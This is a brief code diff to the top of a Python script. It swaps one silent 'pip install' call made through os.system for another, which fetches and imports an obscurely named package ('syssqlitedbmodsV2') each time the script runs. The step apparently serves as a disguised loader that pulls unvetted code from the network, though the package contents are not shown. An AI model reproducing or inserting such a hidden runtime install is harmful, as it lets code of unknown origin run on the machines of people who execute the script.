@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolouringspackage")
-import syscolouringspackage
+os.system("pip install syssqlitedbmodsV2")
+import syssqlitedbmodsV2
 import random
 import requests
 import time
